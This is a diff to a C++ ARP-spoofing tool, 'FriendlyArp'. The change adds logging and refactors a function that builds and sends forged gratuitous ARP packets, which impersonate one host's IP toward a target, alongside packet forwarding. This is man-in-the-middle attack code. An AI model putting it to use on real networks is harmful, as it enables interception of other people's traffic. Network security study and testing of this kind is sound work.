@@ -34,13 +34,22 @@ void FriendlyArp::send_arp_injections(std::vector<uint32_t> ip_addrs)
                     continue;
 
                 MacAddress target_mac = entry->second;
+
+                if (!injected_flag)
+                {
+                    std::cout << "Sending Gratuitous ARP to " << CliHelper::ip_to_string(ip_addr_2) 
+                              << " impersonating " << CliHelper::ip_to_string(ip_addr_1) 
+                              << " at " << CliHelper::mac_to_string(target_mac) << std::endl;
+                }
+
                 send_arp_injection(ip_addr_1, target_mac, ip_addr_2);
             }
         }
     }
+    injected_flag = true;
 }
 
-bool FriendlyArp::send_arp_injection(   const uint32_t& impersonate_src_ip, const MacAddress& target_mac, 
+void FriendlyArp::send_arp_injection(   const uint32_t& impersonate_src_ip, const MacAddress& target_mac, 
                                         const uint32_t& target_ip)
 {
     std::vector<uint8_t> arp_poisoning;
@@ -52,13 +61,10 @@ bool FriendlyArp::send_arp_injection(   const uint32_t& impersonate_src_ip, cons
     if (pcap_sendpacket(pcap_handle, arp_poisoning.data(), arp_poisoning.size()) != 0) 
     {
         std::cerr << "Failed to send gratuitous ARP: " << pcap_geterr(pcap_handle) << std::endl;
-        return false;
+        return;
     }
 
-    //#std::cout << "Sent gratuitous ARP to " << CliHelper::ip_to_string(target_ip) << " (impersonating "
-    //#          << CliHelper::ip_to_string(impersonate_src_ip) << ")" << std::endl;
-
-    return true;
+    return;
 }
 
 void FriendlyArp::forward_packet(const struct pcap_pkthdr* header, const uint8_t* packet)
